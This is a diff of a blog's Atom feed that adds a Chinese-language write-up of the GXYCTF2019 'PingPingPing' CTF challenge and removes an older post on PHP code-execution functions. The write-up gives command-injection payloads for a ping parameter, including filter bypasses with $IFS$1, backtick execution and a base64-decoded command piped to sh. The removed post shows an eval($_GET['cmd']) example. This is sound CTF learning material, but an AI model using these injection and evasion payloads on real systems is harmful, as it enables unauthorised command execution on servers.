@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://lingxin16.github.io/"/>
-  <updated>2020-06-13T14:24:55.053Z</updated>
+  <updated>2020-06-17T15:17:32.918Z</updated>
   <id>http://lingxin16.github.io/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>GXYCTF2019-PingPingPing</title>
+    <link href="http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/"/>
+    <id>http://lingxin16.github.io/2020/06/17/GXYCTF2019-PingPingPing/</id>
+    <published>2020-06-17T14:02:17.000Z</published>
+    <updated>2020-06-17T15:17:32.918Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目地址:<a href="https://buuoj.cn/" target="_blank" rel="noopener">buuctf</a></p><a id="more"></a><p>打开题目</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/1.png" alt="1"></p><p>只有一个/?ip=</p><p>尝试传?ip=127.0.0.1，得到回显</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/2.png" alt="2"></p><p>利用管道符漏洞，传?ip=127.0.0.1||ls</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/3.png" alt="3"></p><p>看到flag.php 传?ip=127.0.0.1||cat%20flag.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/4.png" alt="4"></p><p>尝试传一下，得知如果我们传入的字符含有flag空格或者/，那么就会返回错误</p><p>这里用$IFS$1来绕过空格的限制，传?ip=127.0.0.1||cat$IFS$1index.php</p><p><img src="/2020/06/17/GXYCTF2019-PingPingPing/5.png" alt="5"></p><p>可以看到确实过滤了很多</p><p>这里我用三种办法</p><h4 id="1-变量替换"><a href="#1-变量替换" class="headerlink" title="1.变量替换"></a>1.变量替换</h4><p><code>preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip</code></p><p>因为这个会判断输入语句中是否按顺序出现f l a g，所以我们用</p><p>?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</p><h4 id="2-内敛执行"><a href="#2-内敛执行" class="headerlink" title="2.内敛执行"></a>2.内敛执行</h4><pre><code>?ip=127.0.0.1||a=g;cat$IFS$1`ls`</code></pre><h4 id="3-sh"><a href="#3-sh" class="headerlink" title="3.sh"></a>3.sh</h4><p>既然过滤了bash，那么可以用sh</p><p>?ip=127.0.0.1||echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p><p>其中Y2F0IGZsYWcucGhw是base64加密之后的cat flag.php</p><p>关于命令执行的绕过，可以参考ghtwf01师傅的这篇文章：<a href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener">命令执行漏洞利用及绕过方式总结</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;题目地址:&lt;a href=&quot;https://buuoj.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;buuctf&lt;/a&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+    
+      <category term="ctf" scheme="http://lingxin16.github.io/tags/ctf/"/>
+    
+      <category term="web" scheme="http://lingxin16.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>极客大挑战2019-Http</title>
@@ -423,27 +446,6 @@
     <summary type="html">
     
       &lt;h2 id=&quot;命令执行漏洞&quot;&gt;&lt;a href=&quot;#命令执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;命令执行漏洞&quot;&gt;&lt;/a&gt;命令执行漏洞&lt;/h2&gt;
-    
-    </summary>
-    
-    
-    
-      <category term="代码审计" scheme="http://lingxin16.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>代码审计day5</title>
-    <link href="http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/"/>
-    <id>http://lingxin16.github.io/2020/03/21/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1day5/</id>
-    <published>2020-03-21T15:15:22.000Z</published>
-    <updated>2020-03-21T15:58:00.820Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h2><a id="more"></a><p>代码执行漏洞是指应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行。当应用在调用一些能将字符串转化成代码的函数(如php中的eval)时，没有考虑到用户是否能控制这个字符串，将造成代码注入漏洞。狭义的代码注入通常指将可执行代码注入到当前页面中，如php的eval函数，可以将字符串代表的代码作为php代码执行，当前用户能够控制这段字符串时，将产生代码注入漏洞</p><h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><p>eval和assert<br>回调函数<br>动态执行函数<br>preg_replace函数</p><p>1.eval()、assert()将输入的字符串参数作为PHP程序代码来执行</p><p>2.回调函数mixed call_user_ func ( callable $callback [, mixed $parameter [, mixed $… ]])<br>$callback是要调用的自定义函数名称<br>$parameter是自定义函数的参数<br>常见的回调函数:<br>call_user_func()、call_user_func_array()、array_map()等</p><pre><code>&lt;?phpfunction callBack()[        $b = $_GET[&#39;cmd&#39;];        eval($b);]call_user_func(function&#39;callBack&#39;,$b);?&gt;</code></pre><p>3.动态执行函数</p><pre><code>1.定义一个函数2.将函数名(字符串)赋值给一个变量3.使用变量名代替函数名动态调用函数</code></pre><p>4.preg_replace</p><pre><code>mixed preg_replace ( mixed $pattern,mixed $replacement , mixed $subject [, int $limit =-1 [, int &amp;$count]])$pattern正则匹配的内容$replacement用于替换的字符串或字符串数组$subject要进行搜索和替换的字符串或字符串数组$pattern存在/e模式修正符修饰 允许代码执行</code></pre><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><p>正则表达式语法规则                         普通字符作为原子</p><p>限定符                                                特殊符号作为原子</p><p>边界限制符                                        通用字符类型作为原子</p><p>后向引用                                            自定义原子表作为原子</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;代码执行漏洞&quot;&gt;&lt;a href=&quot;#代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;代码执行漏洞&quot;&gt;&lt;/a&gt;代码执行漏洞&lt;/h2&gt;
     
     </summary>
     
